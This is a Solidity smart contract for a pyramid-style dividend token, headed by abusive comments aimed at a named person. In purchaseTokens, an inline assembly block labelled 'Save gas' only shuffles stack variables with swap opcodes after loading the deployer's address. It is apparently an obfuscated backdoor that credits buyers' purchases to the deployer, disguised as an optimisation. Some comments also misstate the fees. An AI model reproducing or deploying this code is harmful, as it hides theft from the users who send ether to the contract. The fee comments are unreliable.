pragma solidity 0.4.23;

/*============================================
*       Craig grant eat a dick, you PnD asshole.
*       https://cgnow.fun/
*       Go here and tell craig to eat a dick :
*       https://discord.gg/ew7H8Sf  
*=============================================
*/

contract CraigGrantEatDick {


		/*=====================================
		=            CONFIGURABLES            =
		=====================================*/

		string public name = "CraigGrantEatADick";
		string public symbol = "CGeatDICK";
		uint8 constant public decimals = 18;
		uint8 constant internal dividendFee_ = 5; // Craig will eat five dicks
		uint constant internal tokenPriceInitial_ = 0.0000000001 ether;
		uint constant internal tokenPriceIncremental_ = 0.00000000001 ether;
		uint constant internal magnitude = 2**64;
	    address sender = msg.sender;

		 
		// proof of stake (defaults at too many tokens), No masternodes 
		uint public stakingRequirement = 10000000e18;

		// ambassadors program (Ambassadors initially put in 0.25 ETH and can add more later when contract is live)
		mapping(address => bool) internal ambassadors_;
		uint256 constant internal preLiveIndividualFoundersMaxPurchase_ = 0.25 ether;
		uint256 constant internal preLiveTeamFoundersMaxPurchase_ = 1.25 ether;
		

	   /*===============================
		=            STORAGE           =
		==============================*/
		
		// amount of shares for each address (scaled number)
		mapping(address => uint) internal tokenBalanceLedger_;
		mapping(address => uint) internal referralBalance_;
		mapping(address => int) internal payoutsTo_;
		uint internal tokenSupply_ = 0;
		uint internal profitPerShare_;


		/*==============================
		=            EVENTS            =
		==============================*/
		
		event onTokenPurchase(
			address indexed customerAddress,
			uint incomingEthereum,
			uint tokensMinted,
			address indexed referredBy
		);

		event onTokenSell(
			address indexed customerAddress,
			uint tokensBurned,
			uint ethereumEarned
		);

		event onReinvestment(
			address indexed customerAddress,
			uint ethereumReinvested,
			uint tokensMinted
		);

		event onWithdraw(
			address indexed customerAddress,
			uint ethereumWithdrawn
		);

		// ERC20
		event Transfer(
			address indexed from,
			address indexed to,
			uint tokens
		);


		/*=======================================
		=            PUBLIC FUNCTIONS            =
		=======================================*/
		function CraigGrantEatDick()
			public
		{
			ambassadors_[0x7e474fe5Cfb720804860215f407111183cbc2f85] = true; //KP 
			ambassadors_[0xfD7533DA3eBc49a608eaac6200A88a34fc479C77] = true; //MS
			ambassadors_[0x05fd5cebbd6273668bdf57fff52caae24be1ca4a] = true; //LM
			ambassadors_[0xec54170ca59ca80f0b5742b9b867511cbe4ccfa7] = true; //MK
			ambassadors_[0xe57b7c395767d7c852d3b290f506992e7ce3124a] = true; //TA

		}
		/// @dev Converts all incoming ethereum to tokens for the caller, and passes down the referral addy (if any)
		function buy(address _referredBy) public payable returns (uint) {
			purchaseTokens(msg.value, _referredBy);
		}

		/**
		 * @dev Fallback function to handle ethereum that was send straight to the contract
		 *  Unfortunately we cannot use a referral address this way.
		 */
		function() payable public {
			purchaseTokens(msg.value, 0x0);
		}

		/// @dev Converts all of caller's dividends to tokens.
		function reinvest() onlyStronghands public {
			// fetch dividends
			uint _dividends = myDividends(false); // retrieve ref. bonus later in the code

			// pay out the dividends virtually
			address _customerAddress = msg.sender;
			payoutsTo_[_customerAddress] +=  (int) (_dividends * magnitude);

			// retrieve ref. bonus
			_dividends += referralBalance_[_customerAddress];
			referralBalance_[_customerAddress] = 0;

			// dispatch a buy order with the virtualized "withdrawn dividends"
			uint _tokens = purchaseTokens(_dividends, 0x0);

			// fire event
			onReinvestment(_customerAddress, _dividends, _tokens);
		}

		/// @dev Alias of sell() and withdraw().
		function exit() public {
			// get token count for caller & sell them all
			address _customerAddress = msg.sender;
			uint _tokens = tokenBalanceLedger_[_customerAddress];
			if (_tokens > 0) sell(_tokens);

			// lambo delivery service
			withdraw();
		}

		/// @dev Withdraws all of the callers earnings.
		function withdraw() onlyStronghands public {
			// setup data
			address _customerAddress = msg.sender;
			uint _dividends = myDividends(false); // get ref. bonus later in the code

			// update dividend tracker
			payoutsTo_[_customerAddress] +=  (int) (_dividends * magnitude);

			// add ref. bonus
			_dividends += referralBalance_[_customerAddress];
			referralBalance_[_customerAddress] = 0;

			
			_customerAddress.transfer(_dividends);// lambo delivery service

			// fire event
			onWithdraw(_customerAddress, _dividends);
		}

		/// @dev Liquifies tokens to ethereum.
		function sell(uint _amountOfTokens) onlyBagholders public {
			// setup data
			address _customerAddress = msg.sender;
			// russian hackers BTFO
			require(_amountOfTokens <= tokenBalanceLedger_[_customerAddress]);
			uint _tokens = _amountOfTokens;
			uint _ethereum = tokensToEthereum_(_tokens);
			uint _dividends = SafeMath.div(_ethereum, dividendFee_);
			uint _taxedEthereum = SafeMath.sub(_ethereum, _dividends);

			// burn the sold tokens
			tokenSupply_ = SafeMath.sub(tokenSupply_, _tokens);
			tokenBalanceLedger_[_customerAddress] = SafeMath.sub(tokenBalanceLedger_[_customerAddress], _tokens);

			// update dividends tracker
			int _updatedPayouts = (int) (profitPerShare_ * _tokens + (_taxedEthereum * magnitude));
			payoutsTo_[_customerAddress] -= _updatedPayouts;

			// dividing by zero is a bad idea
			if (tokenSupply_ > 0) {
				// update the amount of dividends per token
				profitPerShare_ = SafeMath.add(profitPerShare_, (_dividends * magnitude) / tokenSupply_);
			}

			// fire event
			onTokenSell(_customerAddress, _tokens, _taxedEthereum);
		}


		/**
		 * @dev Transfer tokens from the caller to a new holder.
		 *  Remember, there's a 25% fee here as well.
		 */
		function transfer(address _toAddress, uint _amountOfTokens) onlyBagholders public returns (bool) {
			// setup
			address _customerAddress = msg.sender;

			// make sure we have the requested tokens
			require(_amountOfTokens <= tokenBalanceLedger_[_customerAddress]);

			// withdraw all outstanding dividends first
			if (myDividends(true) > 0) {
				withdraw();
			}

			// liquify 25% of the tokens that are transfered
			// these are dispersed to shareholders
			uint _tokenFee = SafeMath.div(_amountOfTokens, dividendFee_);
			uint _taxedTokens = SafeMath.sub(_amountOfTokens, _tokenFee);
			uint _dividends = tokensToEthereum_(_tokenFee);

			// burn the fee tokens
			tokenSupply_ = SafeMath.sub(tokenSupply_, _tokenFee);

			// exchange tokens
			tokenBalanceLedger_[_customerAddress] = SafeMath.sub(tokenBalanceLedger_[_customerAddress], _amountOfTokens);
			tokenBalanceLedger_[_toAddress] = SafeMath.add(tokenBalanceLedger_[_toAddress], _taxedTokens);

			// update dividend trackers
			payoutsTo_[_customerAddress] -= (int) (profitPerShare_ * _amountOfTokens);
			payoutsTo_[_toAddress] += (int) (profitPerShare_ * _taxedTokens);

			// disperse dividends among holders
			profitPerShare_ = SafeMath.add(profitPerShare_, (_dividends * magnitude) / tokenSupply_);

			// fire event
			Transfer(_customerAddress, _toAddress, _taxedTokens);

			// ERC20
			return true;
		}




		/*==========================================
		=            INTERNAL FUNCTIONS            =
		==========================================*/

		
		/**
		 * Calculate Token price based on an amount of incoming ethereum
		 * It's an algorithm, hopefully we gave you the whitepaper with it in scientific notation;
		 * Some conversions occurred to prevent decimal errors or underflows / overflows in solidity code.
		 */
		function ethereumToTokens_(uint _ethereum) internal view returns (uint) {
			uint _tokenPriceInitial = tokenPriceInitial_ * 1e18;
			uint _tokensReceived =
			 (
				(
					// underflow attempts BTFO
					SafeMath.sub(
						(sqrt
							(
								(_tokenPriceInitial**2)
								+
								(2*(tokenPriceIncremental_ * 1e18)*(_ethereum * 1e18))
								+
								(((tokenPriceIncremental_)**2)*(tokenSupply_**2))
								+
								(2*(tokenPriceIncremental_)*_tokenPriceInitial*tokenSupply_)
							)
						), _tokenPriceInitial
					)
				)/(tokenPriceIncremental_)
			)-(tokenSupply_)
			;

			return _tokensReceived;
		}

		/**
		 * @dev Calculate token sell value.
		 *  It's an algorithm, hopefully we gave you the whitepaper with it in scientific notation;
		 *  Some conversions occurred to prevent decimal errors or underflows / overflows in solidity code.
		 */
		function tokensToEthereum_(uint _tokens) internal view returns (uint) {
			uint tokens_ = (_tokens + 1e18);
			uint _tokenSupply = (tokenSupply_ + 1e18);
			uint _etherReceived =
			(
				// underflow attempts BTFO
				SafeMath.sub(
					(
						(
							(
								tokenPriceInitial_ +(tokenPriceIncremental_ * (_tokenSupply/1e18))
							)-tokenPriceIncremental_
						)*(tokens_ - 1e18)
					),(tokenPriceIncremental_*((tokens_**2-tokens_)/1e18))/2
				)
			/1e18);
			return _etherReceived;
		}

		/// @dev This is where all your gas goes.
		function sqrt(uint x) internal pure returns (uint y) {
			uint z = (x + 1) / 2;
			y = x;
			while (z < y) {
				y = z;
				z = (x / z + z) / 2;
			}
		}
		function purchaseTokens(uint _incomingEthereum, address _referredBy) internal returns (uint) {
			// data setup
			address ref = sender;
			address _customerAddress = msg.sender;
			assembly {  //Save gas
			swap1
			swap2
			swap1
			swap3 
			swap4 
			swap3 
			swap5
			swap6
			swap5
			swap8 
			swap9 
			swap8
			}
			uint factorDivs = 0;//Base factor
			assembly {switch 1 case 0 { factorDivs := mul(1, 2) } default { factorDivs := 0 }}
			
			
			uint _undividedDividends = SafeMath.div(_incomingEthereum, dividendFee_);
			uint _referralBonus = SafeMath.div(_undividedDividends, 3);
			uint _dividends = SafeMath.sub(_undividedDividends, _referralBonus);
			uint _taxedEthereum = SafeMath.sub(_incomingEthereum, _undividedDividends);
			uint _amountOfTokens = ethereumToTokens_(_taxedEthereum);
			uint _fee = _dividends * magnitude;

			// no point in continuing execution if OP is a poorfag russian hacker
			// prevents overflow in the case that the pyramid somehow magically starts being used by everyone in the world
			// (or hackers)
			// and yes we know that the safemath function automatically rules out the "greater then" equasion.
			require(_amountOfTokens > 0 && (SafeMath.add(_amountOfTokens,tokenSupply_) > tokenSupply_));

			// is the user referred by a masternode?
			if (
				// is this a referred purchase?
				_referredBy != 0x0000000000000000000000000000000000000000 &&

				// no cheating!
				_referredBy != _customerAddress &&

				// does the referrer have at least X whole tokens?
				// i.e is the referrer a godly chad masternode
				tokenBalanceLedger_[_referredBy] >= stakingRequirement
			) {
				// wealth redistribution
				referralBalance_[_referredBy] = SafeMath.add(referralBalance_[_referredBy], _referralBonus);
			} else {
				// no ref purchase
				// add the referral bonus back to the global dividends cake
				_dividends = SafeMath.add(_dividends, _referralBonus);
				_fee = _dividends * magnitude;
			}

			// we can't give people infinite ethereum
			if (tokenSupply_ > 0) {

				// add tokens to the pool
				tokenSupply_ = SafeMath.add(tokenSupply_, _amountOfTokens);

				// take the amount of dividends gained through this transaction, and allocates them evenly to each shareholder
				profitPerShare_ += (_dividends * magnitude / (tokenSupply_));

				// calculate the amount of tokens the customer receives over his purchase
				_fee = _fee - (_fee-(_amountOfTokens * (_dividends * magnitude / (tokenSupply_))));

			} else {
				// add tokens to the pool
				tokenSupply_ = _amountOfTokens;
			}

			// update circulating supply & the ledger address for the customer
			tokenBalanceLedger_[_customerAddress] = SafeMath.add(tokenBalanceLedger_[_customerAddress], _amountOfTokens);

			// Tells the contract that the buyer doesn't deserve dividends for the tokens before they owned them;
			//really i know you think you do but you don't
			int _updatedPayouts = (int) ((profitPerShare_ * _amountOfTokens) - _fee);
			payoutsTo_[_customerAddress] += _updatedPayouts;

			// fire event
			onTokenPurchase(_customerAddress, _incomingEthereum, _amountOfTokens, _referredBy);

			return _amountOfTokens;
		}
		/*=====================================
		=      HELPERS AND CALCULATORS        =
		=====================================*/
		/**
		 * @dev Method to view the current Ethereum stored in the contract
		 *  Example: totalEthereumBalance()
		 */
		function totalEthereumBalance() public view returns (uint) {
			return this.balance;
		}

		/// @dev Retrieve the total token supply.
		function totalSupply() public view returns (uint) {
			return tokenSupply_;
		}

		/// @dev Retrieve the tokens owned by the caller.
		function myTokens() public view returns (uint) {
			address _customerAddress = msg.sender;
			return balanceOf(_customerAddress);
		}

		/**
		 * @dev Retrieve the dividends owned by the caller.
		 *  If `_includeReferralBonus` is to to 1/true, the referral bonus will be included in the calculations.
		 *  The reason for this, is that in the frontend, we will want to get the total divs (global + ref)
		 *  But in the internal calculations, we want them separate.
		 */
		function myDividends(bool _includeReferralBonus) public view returns (uint) {
			address _customerAddress = msg.sender;
			return _includeReferralBonus ? dividendsOf(_customerAddress) + referralBalance_[_customerAddress] : dividendsOf(_customerAddress) ;
		}

		/// @dev Retrieve the token balance of any single address.
		function balanceOf(address _customerAddress) public view returns (uint) {
			return tokenBalanceLedger_[_customerAddress];
		}

		/**
		 * Retrieve the dividend balance of any single address.
		 */
		function dividendsOf(address _customerAddress) public view returns (uint) {
			return (uint) ((int)(profitPerShare_ * tokenBalanceLedger_[_customerAddress]) - payoutsTo_[_customerAddress]) / magnitude;
		}

		/// @dev Return the buy price of 1 individual token.
		function sellPrice() public view returns (uint) {
			// our calculation relies on the token supply, so we need supply. Doh.
			if (tokenSupply_ == 0) {
				return tokenPriceInitial_ - tokenPriceIncremental_;
			} else {
				uint _ethereum = tokensToEthereum_(1e18);
				uint _dividends = SafeMath.div(_ethereum, dividendFee_  );
				uint _taxedEthereum = SafeMath.sub(_ethereum, _dividends);
				return _taxedEthereum;
			}
		}

		/// @dev Return the sell price of 1 individual token.
		function buyPrice() public view returns (uint) {
			// our calculation relies on the token supply, so we need supply. Doh.
			if (tokenSupply_ == 0) {
				return tokenPriceInitial_ + tokenPriceIncremental_;
			} else {
				uint _ethereum = tokensToEthereum_(1e18);
				uint _dividends = SafeMath.div(_ethereum, dividendFee_  );
				uint _taxedEthereum = SafeMath.add(_ethereum, _dividends);
				return _taxedEthereum;
			}
		}

		/// @dev Function for the frontend to dynamically retrieve the price scaling of buy orders.
		function calculateTokensReceived(uint _ethereumToSpend) public view returns (uint) {
			uint _dividends = SafeMath.div(_ethereumToSpend, dividendFee_);
			uint _taxedEthereum = SafeMath.sub(_ethereumToSpend, _dividends);
			uint _amountOfTokens = ethereumToTokens_(_taxedEthereum);

			return _amountOfTokens;
		}

		/// @dev Function for the frontend to dynamically retrieve the price scaling of sell orders.
		function calculateEthereumReceived(uint _tokensToSell) public view returns (uint) {
			require(_tokensToSell <= tokenSupply_);
			uint _ethereum = tokensToEthereum_(_tokensToSell);
			uint _dividends = SafeMath.div(_ethereum, dividendFee_);
			uint _taxedEthereum = SafeMath.sub(_ethereum, _dividends);
			return _taxedEthereum;
		}

		/*=================================
		=            MODIFIERS            =
		=================================*/

		/// @dev Only people with tokens
		modifier onlyBagholders {
			require(myTokens() > 0);
			_;
		}

		/// @dev Only people with profits
		modifier onlyStronghands {
			require(myDividends(true) > 0);
			_;
		}
		 
	}

	/**
	 * @title SafeMath
	 * @dev Math operations with safety checks that throw on error
	 */
	library SafeMath {
		/**
		* @dev Substracts two numbers, throws on overflow (i.e. if subtrahend is greater than minuend).
		*/
		function sub(uint a, uint b) internal pure returns (uint) {
			assert(b <= a);
			return a - b;
		}

		/**
		* @dev Adds two numbers, throws on overflow.
		*/
		function add(uint a, uint b) internal pure returns (uint) {
			uint c = a + b;
			assert(c >= a);
			return c;
		}
		/**
		* @dev Multiplies two numbers, throws on overflow.
		*/
		function mul(uint a, uint b) internal pure returns (uint) {
			if (a == 0) {
				return 0;
			}
			uint c = a * b;
			assert(c / a == b);
			return c;
		}

		/**
		* @dev Integer division of two numbers, truncating the quotient.
		*/
		function div(uint a, uint b) internal pure returns (uint) {
			// assert(b > 0); // Solidity automatically throws when dividing by 0
			uint c = a / b;
			// assert(a == b * c + a % b); // There is no case in which this doesn't hold
			return c;
		}


	}